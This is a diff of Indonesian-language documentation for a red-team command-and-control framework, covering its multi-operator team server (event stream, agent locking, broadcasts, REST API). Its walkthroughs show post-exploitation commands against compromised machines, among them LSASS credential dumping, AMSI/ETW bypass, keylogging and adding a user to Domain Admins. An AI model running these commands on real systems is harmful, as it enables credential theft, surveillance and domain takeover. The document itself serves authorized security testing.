@@ -1,229 +1,379 @@
 # 20 — Multi-Operator Team Server
 
 > Lebih dari satu operator bisa terhubung ke C2 server secara bersamaan,
-> melihat aktivitas real-time, dan mengkoordinasikan aksi tanpa saling
-> mengganggu.
+> melihat aktivitas real-time, dan mengkoordinasikan aksi tanpa saling mengganggu.
 
 ---
 
-## Arsitektur
+## Arsitektur Team Server
 
 ```
-Operator 1 ──SSE stream──┐
-Operator 2 ──SSE stream──┤──► TeamHub (in-memory) ──► Broadcast events
-Operator 3 ──SSE stream──┘
-                │
-                ├── Agent claims (exclusive write lock per agent)
-                └── Event types: checkin, result_ready, note, claim/release
-```
-
-- **SSE (Server-Sent Events)** — push unidirectional dari server ke operator.
-  Tidak butuh WebSocket atau dependency tambahan.
-- **Operator session** — setiap operator mendapat `session_id` saat join.
-  Session digunakan untuk claim/release agent.
-- **Agent claiming** — satu operator bisa "lock" agent agar tidak ada operator lain
-  yang bisa queue command untuk agent tersebut.
-
----
-
-## Quick Start
-
-### Terminal 1 — Operator Alice
-
-```bash
-# Mulai live stream — semua event masuk real-time
-./bin/operator team subscribe alice --server http://c2:8080
-
-# Output:
-# [+] Connected to team server as alice (session: 3a7f1b2c-...)
-# [*] Press Ctrl+C to disconnect
-#
-# [+] 14:23:01 [2703886d] <alice> CORP-LAPTOP-JD01 checked in from 192.168.1.50
-# [=] 14:23:45 [2703886d] cmd=execute status=completed duration=1.2s
-```
-
-### Terminal 2 — Operator Bob (second operator)
-
-```bash
-./bin/operator team subscribe bob --server http://c2:8080
-
-# Bob sees the same events — including alice's activity
-# [+] 14:23:01 [2703886d] CORP-LAPTOP-JD01 checked in from 192.168.1.50
-# [*] 14:23:10 <alice> alice joined the team server
+┌─────────────────────────────────────────────────────────────────────┐
+│                          C2 SERVER                                  │
+│                                                                     │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │                        TeamHub                              │   │
+│   │                                                             │   │
+│   │  operators:                   claims:                      │   │
+│   │    "alice-abc" → Alice        "agent-123" → "alice-abc"    │   │
+│   │    "bob-xyz"   → Bob          "agent-456" → "bob-xyz"      │   │
+│   │                               "agent-789" → (unclaimed)    │   │
+│   │                                                             │   │
+│   │  event channel: chan TeamEvent (buffered 64)                │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│          │                  │                   │                   │
+│          │ fan-out SSE      │                   │                   │
+│          ▼                  ▼                   ▼                   │
+│   [Alice's session]  [Bob's session]   [Charlie's session]          │
+│    (SSE stream)       (SSE stream)      (SSE stream)                │
+└─────────────────────────────────────────────────────────────────────┘
+          │                  │                   │
+          ▼                  ▼                   ▼
+    Alice's terminal   Bob's terminal    Charlie's terminal
 ```
 
 ---
 
-## Commands
+## Fitur Team Server
 
-### `team subscribe <name>`
+| Fitur | Deskripsi |
+|-------|-----------|
+| Operator registration | Setiap operator dapat session ID unik |
+| Real-time SSE stream | Semua event dikirim ke semua operator secara realtime |
+| Agent claiming | Satu operator bisa "klaim" agent (exclusive write lock) |
+| CanWrite enforcement | Operator lain tidak bisa kirim command ke agent yang diklaim |
+| Event broadcast | Operator bisa broadcast pesan ke semua operator |
+| Auto-cleanup | Operator disconnect → claim-nya dilepas otomatis |
 
-Membuka live event stream. Semua event dari server di-push ke terminal secara real-time.
+---
 
-```bash
-./bin/operator team subscribe alice
-./bin/operator team subscribe alice --server https://c2.yourdomain.com
+## Cara Kerja CanWrite
+
+```
+Request: POST /api/v1/command/execute
+Header : X-Session-ID: alice-abc
+
+Server logic:
+  agentID = "9c821d77"
+  sessionID = "alice-abc"
+
+  TeamHub.CanWrite("9c821d77", "alice-abc"):
+    claims["9c821d77"] = ?
+    
+    → "" (unclaimed) → return TRUE → lanjutkan
+    → "alice-abc"    → return TRUE → lanjutkan (same operator)
+    → "bob-xyz"      → return FALSE → 409 Conflict!
 ```
 
-Events yang ditampilkan:
+---
 
-| Event | Ikon | Keterangan |
-|-------|------|-----------|
-| `agent_checkin` | `[+]` | Agent baru atau update heartbeat |
-| `agent_offline` | `[-]` | Agent tidak check-in dalam timeout window |
-| `result_ready` | `[=]` | Command selesai dieksekusi |
-| `command_queued` | `[>]` | Command baru dikirim ke agent |
-| `operator_joined` | `[*]` | Operator lain join |
-| `operator_left` | `[*]` | Operator disconnect |
-| `agent_claimed` | `[L]` | Agent di-lock oleh operator |
-| `agent_released` | `[U]` | Agent di-release |
-| `note` | `[!]` | Pesan dari operator lain |
+## Event Types yang Di-Broadcast
 
-### `team operators`
+| Event Type | Kapan Terjadi | Payload |
+|------------|---------------|---------|
+| `agent_checkin` | Agent baru beacon/register | hostname, IP |
+| `result_ready` | Perintah selesai dieksekusi | cmd type, status, duration |
+| `operator_message` | Broadcast manual dari operator | pesan custom |
 
-List semua operator yang sedang terhubung.
+---
 
-```bash
-./bin/operator team operators
+## Langkah 1: Daftar Operator dan Subscribe Event Stream
 
-# Output:
-# SESSION ID                            NAME              JOINED
-# ─────────────────────────────────────────────────────────────────
-# 3a7f1b2c-8d4e-4f1a-9b3c-1234567890ab  alice             14:20:05
-# 9f2e8a1d-3c7b-4e2f-8d5a-abcdef012345  bob               14:23:10
-#
-# 2 operator(s) connected
-```
+Setiap operator membuka terminal dan subscribe ke event stream:
 
-### `team claim <agent-id>` / `team release <agent-id>`
-
-Klaim exclusive write access ke agent. Operator lain masih bisa lihat agent,
-tapi tidak bisa queue command.
+### Terminal Alice
 
 ```bash
-# Dapatkan session_id dari output 'team subscribe' atau salin dari header response
-SESSION=3a7f1b2c-8d4e-4f1a-9b3c-1234567890ab
-
-./bin/operator team claim 2703886d --session $SESSION
-# [+] Agent 2703886d claimed
-
-# Sekarang Alice punya exclusive access
-./bin/operator cmd 2703886d "whoami"  # berhasil
-
-# Bob mencoba queue command ke agent yang sama:
-./bin/operator cmd 2703886d "ipconfig"
-# [!] HTTP 409: agent 2703886d is already claimed by alice
-
-# Alice selesai
-./bin/operator team release 2703886d --session $SESSION
-# [+] Agent 2703886d released
+./bin/operator team subscribe \
+  --name "Alice" \
+  --server https://c2.corp.local:8000
 ```
 
-### `team broadcast`
+**Output Alice:**
+```
+[*] Registering operator Alice...
+[+] Session ID: alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789
+[*] Subscribing to event stream...
+[+] Connected. Listening for events...
 
-Kirim catatan ke semua operator yang terhubung — berguna untuk koordinasi.
+[09:00:01] SYSTEM: Alice joined (2 operators online)
+```
+
+### Terminal Bob
+
+```bash
+./bin/operator team subscribe \
+  --name "Bob" \
+  --server https://c2.corp.local:8000
+```
+
+**Output Bob:**
+```
+[+] Session ID: bob-2c4d6e8f-0a1b-2345-cdef-012345678901
+[+] Connected.
+
+[09:01:15] SYSTEM: Bob joined (2 operators online)
+```
+
+**Alice melihat di streamnya:**
+```
+[09:01:15] SYSTEM: Bob joined (2 operators online)
+```
+
+---
+
+## Langkah 2: Lihat Semua Operator
+
+```bash
+./bin/operator team operators --server https://c2.corp.local:8000
+```
+
+**Output:**
+```
+[+] Connected operators (2):
+
+SESSION ID              NAME    JOINED          AGENTS CLAIMED
+----------------------  ------  --------------  --------------
+alice-8f3a2b1c-...      Alice   09:00:01        0
+bob-2c4d6e8f-...        Bob     09:01:15        0
+```
+
+---
+
+## Langkah 3: Real-Time Event Stream
+
+Setelah agent connect, semua operator melihat event:
+
+**Event yang muncul di stream Alice DAN Bob:**
+```
+[09:05:01] AGENT_CHECKIN  agent=2703886d  host=DESKTOP-QLPBF95  ip=192.168.1.105  user=john.doe
+[09:07:12] AGENT_CHECKIN  agent=9c821d77  host=DC01             ip=192.168.1.100  user=NT AUTHORITY\SYSTEM
+[09:12:45] RESULT_READY   agent=2703886d  cmd=execute  status=completed  duration=1.3s
+[09:15:00] RESULT_READY   agent=9c821d77  cmd=inject_remote  status=completed  duration=0.8s
+```
+
+---
+
+## Langkah 4: Claim Agent (Exclusive Write Lock)
+
+Alice mengklaim DC01 agar Bob tidak bisa mengirim command ke sana secara tidak sengaja:
+
+### Alice Claim DC01
+
+```bash
+./bin/operator team claim 9c821d77 \
+  --session alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789 \
+  --server https://c2.corp.local:8000
+```
+
+**Output Alice:**
+```
+[+] Agent 9c821d77 (DC01) claimed successfully.
+[i] Operator lain tidak bisa mengirim command ke agent ini.
+[i] Release dengan: team release 9c821d77 --session alice-...
+```
+
+**Event yang muncul di stream Bob:**
+```
+[09:20:00] AGENT_CLAIMED  agent=9c821d77  host=DC01  claimed_by=Alice
+```
+
+### Bob Claim Workstation
+
+```bash
+./bin/operator team claim 2703886d \
+  --session bob-2c4d6e8f-0a1b-2345-cdef-012345678901 \
+  --server https://c2.corp.local:8000
+```
+
+**Output Bob:**
+```
+[+] Agent 2703886d (DESKTOP-QLPBF95) claimed by Bob.
+```
+
+---
+
+## Langkah 5: Enforcement — Command Ditolak kalau Tidak Punya Claim
+
+Bob mencoba kirim command ke DC01 yang diklaim Alice:
+
+```bash
+./bin/operator cmd 9c821d77 "whoami" --server https://c2.corp.local:8000
+```
+
+**Output Bob:**
+```
+[!] 409 Conflict: agent 9c821d7 is claimed by Alice — release it first or use their session
+```
+
+Semua endpoint berikut di-enforce dengan cek ini:
+- `cmd` (execute)
+- `inject` (remote/self/ppid)
+- `hollow`, `hijack`, `stomp`, `mapinject`
+- `bypass` (amsi/etw)
+- `token` (steal/make/revert/runas)
+- `creds` (lsass/sam/browser/clipboard)
+- `keylog`, `screenshot`
+- `netscan`, `arpscan`, `socks5`
+- `registry` (read/write/delete/list)
+- `bof`, `opsec`, `lolbin`, `ads`
+- `persistence`, `process`
+
+---
+
+## Langkah 6: Cek Status Claim Agent
+
+```bash
+./bin/operator team claim 9c821d77 --status \
+  --server https://c2.corp.local:8000
+```
+
+**Output:**
+```
+[+] Claim status for agent 9c821d77 (DC01):
+
+    Claimed : YES
+    By      : Alice (alice-8f3a2b1c-...)
+    Since   : 09:20:00 (15 minutes ago)
+```
+
+**Kalau tidak diklaim:**
+```
+[+] Claim status for agent 7f2a3b4c:
+    Claimed : NO (available to all operators)
+```
+
+---
+
+## Langkah 7: Release Agent
+
+Alice selesai dengan DC01 dan release:
+
+```bash
+./bin/operator team release 9c821d77 \
+  --session alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789 \
+  --server https://c2.corp.local:8000
+```
+
+**Output Alice:**
+```
+[+] Agent 9c821d77 released.
+[i] Agent sekarang bisa diakses oleh semua operator.
+```
+
+**Event di stream semua operator:**
+```
+[09:35:00] AGENT_RELEASED  agent=9c821d77  host=DC01  released_by=Alice
+```
+
+---
+
+## Langkah 8: Broadcast Pesan ke Semua Operator
 
 ```bash
 ./bin/operator team broadcast \
-  --session $SESSION \
-  --message "Starting LSASS dump on DC01, do not disturb agent 2703886d"
+  --message "Alice: DC01 domain dump selesai. Pindah ke FileServer-01." \
+  --server https://c2.corp.local:8000
+```
 
-# Semua operator menerima:
-# [!] 14:30:00 <alice> Starting LSASS dump on DC01, do not disturb agent 2703886d
+**Event yang muncul di SEMUA operator:**
+```
+[09:35:15] BROADCAST  Alice: DC01 domain dump selesai. Pindah ke FileServer-01.
 ```
 
 ---
 
-## Contoh Workflow Tim 2 Operator
+## Skenario Tim Lengkap
 
 ```bash
-# === ALICE (initial access, C2 setup) ===
-# Terminal 1:
-./bin/operator team subscribe alice
+# ── Setup (semua operator subscribe dulu) ─────────────────
+# Terminal Alice:
+./bin/operator team subscribe --name Alice --server https://c2.corp.local:8000
+# Session: alice-abc...
 
-# Tunggu agent masuk...
-# [+] 14:23:01 [2703886d] CORP-LAPTOP-JD01 checked in
+# Terminal Bob:
+./bin/operator team subscribe --name Bob --server https://c2.corp.local:8000
+# Session: bob-xyz...
 
-# Claim agent
-./bin/operator team claim 2703886d --session $ALICE_SESSION
+# ── Lihat operator aktif ──────────────────────────────────
+./bin/operator team operators --server https://c2.corp.local:8000
+# alice-abc  Alice  2 agents claimed: 0
+# bob-xyz    Bob    0 agents claimed: 0
 
-# Lakukan initial evasion
-./bin/operator bypass amsi 2703886d --wait
-./bin/operator bypass etw 2703886d --wait
+# ── Alice handle DC, Bob handle workstation ───────────────
+# Alice:
+./bin/operator team claim 9c821d77 --session alice-abc --server ...
+./bin/operator cmd 9c821d77 "whoami" --server ... --wait
+./bin/operator creds lsass 9c821d77 --server ... --wait
 
-# Broadcast ke bob bahwa agent siap
-./bin/operator team broadcast --session $ALICE_SESSION \
-  --message "2703886d ready for post-ex. Evasion done. Your turn Bob."
+# Bob (parallel):
+./bin/operator team claim 2703886d --session bob-xyz --server ...
+./bin/operator bypass amsi 2703886d --server ... --wait
+./bin/operator screenshot 2703886d --server ... --wait
+./bin/operator keylog start 2703886d --duration 300 --server ... --wait
 
-# === BOB (post-exploitation) ===
-# Terminal 2:
-./bin/operator team subscribe bob
+# ── Koordinasi via broadcast ──────────────────────────────
+./bin/operator team broadcast \
+  --message "Alice: LSASS dump selesai. Upload ke /loot/dc01_lsass.dmp" \
+  --server ...
 
-# Terima notifikasi dari alice
-# [!] 14:25:30 <alice> 2703886d ready for post-ex. Evasion done. Your turn Bob.
+# ── Alice selesai, release DC ─────────────────────────────
+./bin/operator team release 9c821d77 --session alice-abc --server ...
 
-# Alice release dulu
-./bin/operator team release 2703886d --session $ALICE_SESSION
-
-# Bob claim
-./bin/operator team claim 2703886d --session $BOB_SESSION
-
-# Bob jalankan post-ex
-./bin/operator creds lsass 2703886d --wait
-./bin/operator screenshot 2703886d --wait
+# ── Bob ambil DC (karena sudah direlease) ─────────────────
+./bin/operator team claim 9c821d77 --session bob-xyz --server ...
+./bin/operator cmd 9c821d77 "net group 'Domain Admins' /add bob /domain" --server ... --wait
 ```
 
 ---
 
-## API Reference (untuk integrasi custom)
+## API Reference (untuk Custom Integration)
+
+Semua endpoint team server dapat diakses langsung via REST API:
 
 ```bash
 # Register operator
-curl -X POST http://c2:8080/api/v1/team/register \
+curl -X POST https://c2.corp.local:8000/api/v1/team/register \
   -H "Content-Type: application/json" \
-  -d '{"name":"alice"}'
-# → {"session_id":"...","name":"alice"}
-
-# SSE stream
-curl -N http://c2:8080/api/v1/team/events?name=alice
-# → data: {"type":"agent_checkin","agent_id":"...","payload":"...","time":"..."}
+  -d '{"name": "Alice"}'
+# {"success":true,"data":{"session_id":"alice-abc...","name":"Alice"}}
 
 # List operators
-curl http://c2:8080/api/v1/team/operators
+curl https://c2.corp.local:8000/api/v1/team/operators
 
 # Claim agent
-curl -X POST http://c2:8080/api/v1/team/agent/2703886d.../claim \
-  -H "X-Session-ID: <session_id>"
+curl -X POST https://c2.corp.local:8000/api/v1/team/agent/9c821d77/claim \
+  -H "X-Session-ID: alice-abc..."
 
 # Release agent
-curl -X POST http://c2:8080/api/v1/team/agent/2703886d.../release \
-  -H "X-Session-ID: <session_id>"
+curl -X POST https://c2.corp.local:8000/api/v1/team/agent/9c821d77/release \
+  -H "X-Session-ID: alice-abc..."
 
-# Broadcast note
-curl -X POST http://c2:8080/api/v1/team/broadcast \
-  -H "X-Session-ID: <session_id>" \
+# Cek status claim
+curl https://c2.corp.local:8000/api/v1/team/agent/9c821d77/claim
+
+# Broadcast event
+curl -X POST https://c2.corp.local:8000/api/v1/team/broadcast \
   -H "Content-Type: application/json" \
-  -d '{"type":"note","payload":"Starting privesc on target"}'
+  -d '{"message": "Phase 1 complete"}'
+
+# Subscribe SSE stream (streaming, tidak pernah selesai sampai disconnect)
+curl -N https://c2.corp.local:8000/api/v1/team/events?name=Alice
+# data: {"type":"system","payload":"Alice joined","time":"..."}
+# data: {"type":"agent_checkin","agent_id":"...","payload":"DC01 checked in","time":"..."}
 ```
 
 ---
 
-## OPSEC untuk Tim
+## Troubleshooting Team Server
 
-```
-□ Setiap operator punya ENCRYPTION_KEY yang sama
-□ Gunakan --api-key untuk authenticate ke server jika diset
-□ Claim agent sebelum melakukan operasi sensitif
-□ Broadcast setiap tindakan besar (lsass dump, persistence) ke tim
-□ Gunakan 'team broadcast' untuk dokumentasi real-time
-□ Log dari console disimpan untuk laporan (readline history)
-```
+| Masalah | Penyebab | Solusi |
+|---------|----------|--------|
+| `409 Conflict` saat kirim command | Agent diklaim operator lain | `team operators` untuk lihat siapa, minta release |
+| SSE stream disconnect setiap 30 detik | Proxy/load balancer timeout | Konfigurasi proxy idle timeout >120s |
+| Operator lain tidak terlihat di `team operators` | Belum subscribe | Jalankan `team subscribe` dulu |
+| Release gagal dengan 403 | Session ID salah atau operator lain yang claim | Hanya operator yang claim bisa release (atau admin) |
 
 ---
 
-**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md) untuk contoh
-penggunaan semua fitur dalam engagement end-to-end.
-
----
-
-*Taburtuai C2 — For authorized security testing only.*
+**Selesai.** Semua fitur Taburtuai C2 telah terdokumentasi. Kembali ke [README](README.md) untuk indeks lengkap.
